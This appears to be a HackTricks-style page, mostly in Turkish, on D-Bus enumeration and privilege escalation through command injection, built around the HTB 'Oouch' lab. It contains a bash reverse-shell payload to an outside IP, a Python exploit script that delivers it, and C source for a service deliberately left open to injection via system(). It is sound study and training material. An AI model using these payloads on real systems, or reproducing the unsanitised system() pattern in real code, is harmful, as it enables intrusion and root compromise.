# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus, Ubuntu desktop ortamlarında süreçler arası iletişim (IPC) aracı olarak kullanılır. Ubuntu'da, birkaç message bus'ın eşzamanlı çalıştığı görülür: öncelikle **privileged services** tarafından sistem genelinde ilgili servisleri sunmak için kullanılan system bus ve yalnızca o belirli kullanıcıya ilgili servisleri sunan, giriş yapmış her kullanıcı için bir session bus. Burada odak, daha yüksek privileges ile çalışan servislerle (örn. root) ilişkili olduğu için ağırlıklı olarak system bus üzerinedir; çünkü hedefimiz privileges yükseltmektir. D-Bus mimarisinin, her session bus için bir 'router' kullandığı ve bunun, client'ların iletişim kurmak istedikleri service için belirttikleri adrese göre client mesajlarını uygun servislere yönlendirmekten sorumlu olduğu belirtilir.

D-Bus üzerindeki services, sundukları **objects** ve **interfaces** ile tanımlanır. Objects, standart OOP dillerindeki class instance'lara benzetilebilir; her instance, benzersiz bir **object path** ile tanımlanır. Filesystem path'e benzeyen bu path, service tarafından sunulan her object'i benzersiz biçimde tanımlar. Araştırma amacıyla önemli bir interface, tek bir method olan Introspect'i içeren **org.freedesktop.DBus.Introspectable** interface'idir. Bu method, object's supported methods, signals ve properties için XML temsili döndürür; burada properties ve signals atlanarak odak methods üzerindedir.

D-Bus interface'i ile iletişim için iki araç kullanıldı: D-Bus tarafından sunulan methods'ları script'lerde kolayca çağırmak için kullanılan **gdbus** adlı bir CLI tool ve her bus'ta mevcut services'i enumerate etmek ve her service içinde bulunan objects'i göstermek için tasarlanmış, Python tabanlı bir GUI tool olan [**D-Feet**](https://wiki.gnome.org/Apps/DFeet).
```bash
sudo apt-get install d-feet
```
Eğer **session bus**’ı kontrol ediyorsanız, önce mevcut adresi doğrulayın:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

İlk görüntüde D-Bus system bus ile kaydedilmiş servisler gösteriliyor; **org.debin.apt** özellikle System Bus butonunu seçtikten sonra vurgulanmış. D-Feet, bu servisten objeleri sorgular ve ikinci görüntüde görüldüğü gibi seçilen objeler için interface, method, property ve signal'leri gösterir. Her method'un signature'ı da ayrıntılı olarak verilir.

Dikkate değer bir özellik, servisin **process ID (pid)** ve **command line** bilgisinin gösterilmesidir; bu, servisin yükseltilmiş privileges ile çalışıp çalışmadığını doğrulamak için faydalıdır ve araştırma açısından önemlidir.

**D-Feet ayrıca method invocation'a izin verir**: kullanıcılar parametre olarak Python expression'ları girebilir, D-Feet bunları servise iletmeden önce D-Bus type'larına dönüştürür.

Ancak, **bazı method'ların invocation'a izin verilmeden önce authentication gerektirdiğini** unutmayın. Bu method'ları görmezden geleceğiz, çünkü amacımız en başta credentials olmadan privileges yükseltmektir.

Ayrıca bazı servislerin, bir kullanıcının belirli aksiyonları yapmasına izin verilip verilmeyeceğini org.freedeskto.PolicyKit1 adlı başka bir D-Bus servisine sorguladığını da not edin.

## **Cmd line Enumeration**

### List Service Objects

Açılmış D-Bus interface'lerini şu şekilde listelemek mümkündür:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`** olarak işaretlenmiş hizmetler özellikle ilginçtir çünkü henüz **çalışmıyorlar**, ancak bir bus isteği onları talep üzerine başlatabilir. `busctl list` ile yetinmeyin; bu isimleri çalıştıracakları gerçek binary'lerle eşleştirin.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Bu, bir activatable isim için hangi `Exec=` yolunun başlatılacağını ve hangi kimlikle çalışacağını hızlıca söyler. Eğer binary veya onun execution chain'i zayıf korunuyorsa, inactive bir service yine de bir privilege-escalation path haline gelebilir.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Bir process bir bus'a bağlantı kurduğunda, bus bu bağlantıya _unique connection name_ adı verilen özel bir bus name atar. Bu tür bus name'ler immutable'dır—bağlantı var olduğu sürece değişmeyecekleri garanti edilir—and, daha da önemlisi, bus lifetime boyunca yeniden kullanılamazlar. Bu, o bus'a yapılan başka hiçbir connection'ın asla böyle bir unique connection name almayacağı anlamına gelir; hatta aynı process bus'a olan bağlantıyı kapatıp yeni bir tane oluştursa bile. Unique connection name'ler kolayca tanınır çünkü otherwise forbidden olan colon karakteriyle başlarlar.

### Service Object Info

Then, you can obtain some information about the interface with:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Ayrıca bus adını onun `systemd` unit'i ve executable path'i ile ilişkilendirin:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Bu, privesc sırasında önemli olan operasyonel soruyu yanıtlar: **bir method çağrısı başarılı olursa, eylemi hangi gerçek binary ve unit gerçekleştirecek?**

### Bir Service Object’in Interfaces listesini çıkarın

Yeterli izinlere sahip olmanız gerekir.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Bir Service Object'in Interface'ini İntrospect Etme

Bu örnekte `tree` parametresi kullanılarak keşfedilen en son interface'in seçildiğine dikkat edin (_önceki bölüme bakın_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Arayüz `htb.oouch.Block`’un `.Block` metoduna dikkat edin (ilgilendiğimiz yöntem bu). Diğer sütunlardaki "s", bir string beklediği anlamına geliyor olabilir.

Tehlikeli bir şey denemeden önce, önce **okuma odaklı** ya da başka şekilde düşük riskli bir metodu doğrulayın. Bu, üç durumu net biçimde ayırır: yanlış sözdizimi, erişilebilir ama reddedildi, ya da erişilebilir ve izin verildi.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Metodlarını Policies ve Actions ile Korele Et

Introspection sana **neyi** çağırabileceğini söyler, ama bir çağrının neden izinli veya reddedildiğini söylemez. Gerçek privesc triage için genellikle **üç katmanı birlikte** incelemen gerekir:

1. **Activation metadata** (`.service` dosyaları veya `SystemdService=`) hangi binary ve unit’in gerçekten çalışacağını öğrenmek için.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) kimin `own`, `send_destination` veya `receive_sender` yapabileceğini öğrenmek için.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) varsayılan authorization modelini öğrenmek için (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
D-Bus method ile Polkit action arasında 1:1 eşleşme olduğunu **varsayma**. Aynı method, değiştirilen objeye veya runtime context’e bağlı olarak farklı bir action seçebilir. Bu nedenle pratik workflow şöyledir:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` ve ilgili `.policy` dosyalarını grep et
3. `busctl call`, `gdbus call` veya `dbusmap --enable-probes --null-agent` ile düşük riskli live probe’lar

Proxy veya compatibility service’ler ekstra dikkat gerektirir. Kendi önceden kurulmuş connection’ı üzerinden istekleri başka bir D-Bus service’e ileten **root-running proxy**, orijinal caller identity yeniden doğrulanmazsa backend’in her isteği UID 0’dan geliyormuş gibi işlemesine yanlışlıkla yol açabilir.

### Monitor/Capture Interface

Yeterli privileges ile (sadece `send_destination` ve `receive_sender` privileges yeterli değildir) bir **D-Bus communication** izleyebilirsin.

Bir **communication**’ı **monitor** etmek için **root** olman gerekir. Eğer root olduğun halde hâlâ sorun yaşıyorsan şunlara bak: [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Eğer non root kullanıcıların communication’ı sniff etmesine izin verecek bir D-Bus config file nasıl yapılandırılır biliyorsan lütfen benimle iletişime geç!

Monitor etmenin farklı yolları:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Aşağıdaki örnekte `htb.oouch.Block` arayüzü izlenir ve **“**_**lalalalal**_**” mesajı yanlış iletişim yoluyla gönderilir**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Sonuçları Wireshark’ın açabileceği bir **pcapng** dosyasına kaydetmek için `monitor` yerine `capture` kullanabilirsiniz:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Tüm gürültüyü filtreleme <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Eğer bus üzerinde çok fazla bilgi varsa, şöyle bir match rule geçin:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Birden fazla kural belirtilebilir. Bir mesaj _kurallardan herhangi biri_ ile eşleşirse, mesaj yazdırılacaktır. Şöyle:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Daha fazla bilgi için match rule syntax hakkında [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) bölümüne bakın.

### More

`busctl` daha da fazla option’a sahiptir, [**hepsini burada bulabilirsiniz**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

**HTB** üzerindeki host "oouch" içinde **qtc** kullanıcısı olarak, _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda bulunan **beklenmedik bir D-Bus config file** bulabilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Önceki yapılandırmadan gelen not: bu D-BUS iletişimi aracılığıyla bilgi göndermek ve almak için **root** veya **www-data** kullanıcısı olmanız gerekir.

docker container **aeb4525789d8** içindeki kullanıcı **qtc** olarak, _/code/oouch/routes.py_ dosyasında dbus ile ilgili bazı kodlar bulabilirsiniz. Bu ilginç koddur:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Gördüğünüz gibi, bu bir **D-Bus arayüzüne bağlanıyor** ve **"Block" fonksiyonuna** "client_ip" gönderiyor.

D-Bus bağlantısının diğer tarafında çalışan derlenmiş bir C binary var. Bu kod, D-Bus bağlantısında **IP adresini dinliyor** ve verilen IP adresini engellemek için `system` fonksiyonu üzerinden iptables çağırıyor.\
**`system` çağrısı bilerek command injection’a karşı savunmasız bırakılmış**, bu yüzden aşağıdaki gibi bir payload reverse shell oluşturacaktır: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit et

Bu sayfanın sonunda, **D-Bus uygulamasının tam C kodunu** bulabilirsiniz. Bunun içinde 91-97. satırlar arasında **`D-Bus object path`** ve **`interface name`**’in nasıl **kaydedildiğini** bulabilirsiniz. Bu bilgi, D-Bus bağlantısına bilgi göndermek için gerekli olacaktır:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ayrıca, 57. satırda bu D-Bus iletişimi için **kaydedilen tek methodun** `Block` olduğu görülebilir(_**Bu yüzden sonraki bölümde payload'lar service object `htb.oouch.Block`'a, interface `/htb/oouch/Block`'a ve method name `Block`'a gönderilecektir**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Aşağıdaki python kodu, payload’ı D-Bus connection üzerinden `Block` method’una `block_iface.Block(runme)` ile gönderecektir (_not that it was extracted from the previous chunk of code_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl ve dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` bir “Message Bus”a mesaj göndermek için kullanılan bir araçtır
- Message Bus – Sistemlerin uygulamalar arasında kolayca iletişim kurmasını sağlamak için kullanılan bir yazılımdır. Message Queue ile ilişkilidir (mesajlar sırayla dizilir) ancak Message Bus içinde mesajlar bir subscription modeliyle gönderilir ve ayrıca çok hızlıdır.
- “-system” tag, bunun bir session message değil, bir system message olduğunu belirtmek için kullanılır (varsayılan olarak).
- “–print-reply” tag, mesajımızı uygun şekilde yazdırmak ve gelen cevapları insan tarafından okunabilir bir formatta almak için kullanılır.
- “–dest=Dbus-Interface-Block” Dbus interface’in adresi.
- “–string:” – Interface’e göndermeyi istediğimiz message tipi. double, bytes, booleans, int, objpath gibi mesaj göndermenin birkaç formatı vardır. Bunlar arasında “object path”, Dbus interface’e bir dosyanın path’ini göndermek istediğimizde faydalıdır. Bu durumda komutu interface’e bir dosya adı altında geçirmek için özel bir dosya (FIFO) kullanabiliriz. “string:;” – Bu, FIFO reverse shell dosyasını/komutunu yerleştirdiğimiz object path’i tekrar çağırmak içindir.

_Note that in `htb.oouch.Block.Block`, ilk kısım (`htb.oouch.Block`) service object’i, son kısım (`.Block`) ise method adını referans eder._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

Büyük bir D-Bus attack surface'ı `busctl`/`gdbus` ile manuel olarak enumeration etmek hızla can sıkıcı hale gelir. Son birkaç yılda yayımlanan iki küçük FOSS utility, red-team veya CTF engagements sırasında işleri hızlandırabilir:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* C ile yazılmış; her object path'i gezen, `Introspect` XML'ini çeken ve onu owning PID/UID ile eşleyen tek bir static binary (<50 kB).
* Yararlı flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Tool, korunmasız well-known names'leri `!` ile işaretler; böylece anında *own* edebileceğiniz (ele geçirebileceğiniz) servisleri veya unprivileged shell'den erişilebilen method call'ları ortaya çıkarır.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Systemd units içinde *writable* path'leri **ve** aşırı permissive D-Bus policy dosyalarını (örn. `send_destination="*"`) arayan yalnızca Python tabanlı script.
* Hızlı kullanım:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module, aşağıdaki dizinleri tarar ve normal bir user tarafından spoof edilebilen veya hijack edilebilen herhangi bir service'i vurgular:
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Yakın zamanda yayımlanan CVE'leri takip etmek, custom code içinde benzer insecure pattern'leri tespit etmeye yardımcı olur. İki iyi yakın tarihli örnek:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root olarak çalışan service, unprivileged users'ın yeniden yapılandırabileceği bir D-Bus interface açığa çıkarıyordu; buna attacker-controlled macro behavior yüklemek de dahildi. | Bir daemon system bus üzerinde **device/profile/config management** açığa çıkarıyorsa, writable configuration ve macro özelliklerini sadece "settings" değil, code-execution primitive olarak değerlendirin. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root olarak çalışan bir compatibility proxy, istekleri original caller'ın security context'ini korumadan backend service'lere iletiyordu; bu yüzden backend'ler proxy'ye UID 0 olarak güveniyordu. | **Proxy / bridge / compatibility** D-Bus service'lerini ayrı bir bug class olarak ele alın: eğer privileged call'ları aktarıyorlarsa, caller UID/Polkit context'in backend'e nasıl ulaştığını doğrulayın. |

Dikkat edilmesi gereken pattern'ler:
1. Service **system bus üzerinde root olarak** çalışır.
2. Ya **authorization check yoktur** ya da check **yanlış subject** üzerinde yapılır.
3. Erişilebilen method sonunda system state'i değiştirir: package install, user/group değişiklikleri, bootloader config, device profile updates, file writes veya doğrudan command execution.

Bir method'un erişilebilir olup olmadığını doğrulamak için `dbusmap --enable-probes` veya manuel `busctl call` kullanın; ardından service'in policy XML'ini ve Polkit actions'larını inceleyerek gerçekte **hangi subject**'in authorize edildiğini anlayın.

---

## Hardening & Detection Quick-Wins

* World-writable veya *send/receive*-open policy'leri arayın:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Tehlikeli method'lar için Polkit gerektirin – hatta *root* proxy'ler bile kendi UID'leri yerine *caller* PID'ini `polkit_authority_check_authorization_sync()` fonksiyonuna iletmelidir.
* Uzun süre çalışan helper'larda privilege düşürün (bus'a bağlandıktan sonra namespace değiştirmek için `sd_pid_get_owner_uid()` kullanın).
* Bir service'i kaldıramıyorsanız, en azından onu özel bir Unix group ile sınırlayın ve XML policy içinde access'i kısıtlayın.
* Blue-team: system bus'u `busctl capture > /var/log/dbus_$(date +%F).pcapng` ile yakalayın ve anomaly detection için Wireshark'a import edin.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
